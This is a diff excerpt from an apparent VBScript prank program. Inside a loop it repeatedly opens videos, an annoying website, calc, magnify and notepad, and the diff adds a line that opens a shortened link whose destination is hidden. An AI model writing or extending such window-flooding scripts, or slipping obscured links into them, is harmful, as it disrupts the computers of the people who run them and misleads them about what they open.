@@ -41,6 +41,7 @@ Do
     WshShell.Run "cmd /c start https://www.youtube.com/watch?v=DLzxrzFCyOs&autoplay=1", 0, False
 	wshShell.Run "https://theannoyingsite.com/", 3, False
     WshShell.Run "calc", 3, False
+    WshShell.Run "https://rb.gy/zzbxz1", 3, False
     WshShell.Run "magnify.exe", 1, False
     WshShell.Run "notepad", 3, False
     WshShell.Run "https://www.youtube.com/watch?v=dQw4w9WgXcQ&autoplay=1", 1, False
